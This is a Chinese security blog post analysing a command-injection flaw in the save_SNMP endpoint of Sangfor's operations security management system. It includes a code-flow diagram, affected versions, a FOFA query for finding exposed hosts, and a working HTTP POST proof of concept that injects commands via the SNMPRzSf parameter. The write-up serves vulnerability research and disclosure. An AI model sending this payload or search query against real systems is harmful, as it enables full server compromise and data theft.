---
title: "深信服运维安全管理系统 save_SNMP 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html
asset_dir: assets/深信服运维安全管理系统-save_snmp-远程命令执行漏洞
---

# 深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/3/7 08:41
* 176浏览
* [0评论](#comment)
* 57分钟阅读

深入探索

授权

鉴权

验证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

深信服运维安全管理系统 save\_SNMP 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

安全运维咨询

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

看下 `com.sbr.fort.web.controller.system.snmp.SNMPController#save_SNMP`的实现逻辑

[![深信服运维安全管理系统 save_SNMP 远程命令执行漏洞](images/img-001-d8f8ca7f3c14.webp)](https://image.mrxn.net/375233493da74f5a8ae5c09d01a6ba86.webp)

代码太长，还是来个流程图，一目了然

漏洞修复方案

[![深信服运维安全管理系统 save_SNMP 远程命令执行漏洞](images/img-002-65c32f855710.webp)](https://image.mrxn.net/0cec5a93c43a402c85fe198e9772237e.webp)

[![深信服运维安全管理系统 save_SNMP 远程命令执行漏洞](images/img-003-680ac170bcd4.webp)](https://image.mrxn.net/8e6384c65f9b44d6ab4961936bc4156a.webp)

文字版本

计算机服务器

```
┌─────────────────────────────────────────────────────────────┐
│          用户发起 POST /save_SNMP 请求                        │
│  参数：SNMPedition, SNMPYhName, SNMPRzPw,                    │
│       SNMPRzSf, SNMPJmPw, SNMPJmSf, SNMPAddress等           │
└───────────────────┬─────────────────────────────────────────┘
                    │
                    ▼
        ┌───────────────────────┐
        │  获取请求参数          │
        │  - 解密部分参数        │
        │  (Decrypt)            │
        └───────────┬───────────┘
                    │
                    ▼
        ┌───────────────────────┐
        │  SNMPAddress          │
        │  长度校验 (>=130?)    │
        └───────────┬───────────┘
                    │
            ┌───────┴────────┐
            │                │
           是                否
            │                │
            ▼                ▼
       ┌────────┐    ┌──────────────────┐
       │ 返回   │    │ SNMPedition 判断  │
       │ 错误   │    │ v2 or v3?        │
       └────────┘    └────────┬─────────┘
                              │
                    ┌─────────┴─────────┐
                    │                   │
                  v2                   v3
                    │                   │
                    ▼                   ▼
        ┌──────────────────┐  ┌────────────────────┐
        │ SNMPName         │  │ SNMPYhName         │
        │ 格式校验 (TNAME) │  │ 格式校验 (TNAME)   │
        │ ✅ 有正则保护     │  │ ✅ 有正则保护       │
        └─────────┬────────┘  └──────────┬─────────┘
                  │                      │
                  ▼                      ▼
        ┌──────────────────┐  ┌────────────────────────┐
        │ SNMPAddress      │  │ SNMPsecurityLevel 判断  │
        │ IP 格式校验      │  │ - noAuthNoPriv         │
        │ ✅ 有正则保护     │  │ - authNopriv           │
        └─────────┬────────┘  │ - authPriv             │
                  │           └──────────┬─────────────┘
                  │                      │
                  │           ┌──────────┼──────────┐
                  │           │          │          │
                  │      noAuthNoPriv  authNopriv authPriv
                  │           │          │          │
                  │           ▼          ▼          ▼
                  │      ┌─────────┐ ┌───────┐ ┌───────┐
                  │      │只拼接    │ │拼接3个 │ │拼接5个 │
                  │      │YhName   │ │参数   │ │参数   │
                  │      └─────────┘ └───────┘ └───────┘
                  │                      │          │
                  ▼                      ▼          ▼
        ┌──────────────────────────────────────────────────┐
        │          构造 shell 命令字符串                     │
        │                                                   │
        │  v2: "bash ... change v2 " + SNMPName            │
        │                                                   │
        │  v3 noAuthNoPriv:                                │
        │      "bash ... change v3 noAuthNoPriv " +        │
        │       SNMPYhName                                 │
        │                                                   │
        │  v3 authNopriv:                                  │
        │      "bash ... change v3 AuthNoPriv " +          │
        │       SNMPYhName + " " +                         │
        │       SNMPRzPw + " " + ⚠️ 未验证                 │
        │       SNMPRzSf         ⚠️ 未验证                 │
        │                                                   │
        │  v3 authPriv:                                    │
        │      "bash ... change v3 AuthPriv " +            │
        │       SNMPYhName + " " +                         │
        │       SNMPRzPw + " " + ⚠️ 未验证                 │
        │       SNMPRzSf + " " + ⚠️ 未验证                 │
        │       SNMPJmPw + " " + ⚠️ 未验证                 │
        │       SNMPJmSf         ⚠️ 未验证                 │
        └─────────────────────┬────────────────────────────┘
                              │
                              ▼
                ┌──────────────────────────┐
                │  executor.exe(shell)     │
                │  ? 命令注入触发点         │
                └──────────────────────────┘
                              │
                              ▼
                ┌──────────────────────────┐
                │  操作系统执行恶意命令      │
                │  例: id > /tmp/pwned     │
                └──────────────────────────┘
```

1. **起点**：流程始于外部对 `/save_SNMP` 接口的HTTP请求。
2. **参数获取**：程序首先获取所有用户提交的参数。
3. **核心分支 (SNMPedition)**：
   1. 如果 `SNMPedition` 为 `v2`，代码会进入一个相对安全的分支。它仅使用经过正则表达式 `TNAME` 校验的 `SNMPName` 参数来拼接命令，有效阻止了[命令注入](https://mrxn.net/tag/rce)。
   2. 如果 `SNMPedition` 为 `v3`，则进入了包含[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)的复杂逻辑分支。
4. **v3 漏洞路径**：
   1. 在 `v3` 路径下，程序会先校验 `SNMPYhName`，这同样是安全的。
   2. 关键在于后续对 `SNMPsecurityLevel` 的判断：
      * 当 `securityLevel` 为 `authNopriv` 或 `authPriv` 时（图中红色高亮节点），程序会将多个**未经任何安全校验**的参数（如 `SNMPRzSf`, `SNMPRzPw` 等）直接拼接到 `shell` 命令字符串中。
5. **危险调用 (Sink Point)**：
   1. 无论通过哪个分支，最终构造好的 `shell` 字符串都会被传递给 `executor.exe()` 方法执行。
   2. 当攻击者通过红色高亮路径，在 `SNMPRzSf` 等参数中注入了恶意命令（例如 `MD5; id`），拼接后的 `shell` 字符串就会包含恶意部分，最终导致任意[命令执行](https://mrxn.net/tag/rce)。

# 漏洞复现

[![深信服运维安全管理系统 save_SNMP 远程命令执行漏洞](images/img-004-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

```
POST /fort/system;help/SNMP/save_SNMP HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

SNMPedition=v3&SNMPsecurityLevel=authPriv&SNMPYhName=testuser&SNMPRzPw=test&SNMPJmPw=test&SNMPJmSf=AES&SNMPRzSf=MD5;RCE_POC&SNMPAddress=127.0.0.1
```

访问命令执行结果文件

安全运维咨询

[![深信服运维安全管理系统 save_SNMP 远程命令执行漏洞](images/img-005-3060ed065015.webp)](https://image.mrxn.net/ba38400b21c843358bb6a3f15270f533.webp)

成功执行 `id` 命令并回显[命令执行](https://mrxn.net/tag/rce)结果。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)  
文章链接：<https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞修复方案

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-SNMP-save\_SNMP-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)

代码安全审计

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALfElEQVR4AeycgXLjNgxE/e7//7n1Cl4KAklZySW2p6XHyAKLBcgQUqxcOv1zu93++a7983i5/hEOwZozHBY+SNc9wiE80zgvdAP52cwLMy9fXDZxNvOOv4sayL12vT/lBNpA7hO+XbXZ5oEbjM29c+2Iy3nYe1UtRC7rrYHIQWDW2Id5zpoZQtR6PWHVirtqubYNJJPLf98JdAOBmD70ONumr4ScN2eE6OdYCMG5DiKGQGlsVVNjwFR3p7fEF5269hfLNzkw/amxCcqXbiAlv8IXn8CPDATiKsh7h+Ag0DmIGDDVruhGPBygXV0PqsHZ1Qt7Hey+a4RuJD+beSFErfPiskHkgUz/lf8jA/mrHaziwwn82kB8VVU8rP4kyLVVCmx3T+ah55R3H4g8IHozYOsDPbpuE96/QGju7q+9f20gv7bj/3jj3xnIf/zQfvPb6wbi23SE39kIPL/N4eua0f7M1X3CvH+tcSx0H4h6cTOztuJML75qFXcDEbnsfSfQBgJxFcBznG1XU7dB9JnF4t1HvqzGED2AH3k01ho2r3WGEOu7BiJ2DUQMmGoITB8W4JhrRXenDeTur/cHnMAfT/876P27FvbJV67GgMvblVQ1TXB3gE13dw9v1wgPiRQoJ4PoAaTs0QW2dYBj4h6ph+zuTt/K/42tO2R6tO9JTAcCbFfKaFswz4304iBq8tUj/syy1r71EP2gR2squoew5kaxdDKINayBY2w+I4QGerQO+tx0IC5a+NoTaAOB47RG24DQ6KqRQcTWirOZM5qHqIH+yQkiZ61rr6LrjBD9XA8RA6YauiZjSxYna+wXSQudz+ikOcfCNhAFH27/i+2tgXzYmP8Ahw/vehtB5IG2dWCrsRYiboLkXNEk+eZC9IMeN8H9i/tmvNPbG6LOuY28f3GcEUILgXdZ97YeQgOBWQg9l/PyITQQKK7aukPqibw5br8Y1n34qsi8OWPOVR/iKoDAmlcM49yV/qqXQfSAHWf1sGtUK7PWCLsGwpdOZo1RXDU41kDEsD/EnNWvO6Se6JvjNhBPDfaJAoftAdtnBxzRIth593POcUbnZpi11XdN5RU7Z4TYl2Mh9Jz4kcFzrdaVjepnHERf1dnaQGZFi3/tCTx9ysrb8RSNztXYfEaIqyFz1T/rA1EPR6w9FENo5Gdz/4w5L3+UMwfjvqqDyFkrTuZYCKGBQHEyiBi4rTvk9lmvNZDPmsetPfZC3DZ1f7qlbM7Bda1rjRC1MH8MhF0D4bveezBC5AFTHY5qgcMDiotg5ys36mONEaK+xoCphsC2B/cVrjukHc9nON2HOsTUvD2IGDDV/r6ticqcALaJw47OnSHsemAoBbbeWm9mEJraAMZ81c1irwfRBwKz3hpzj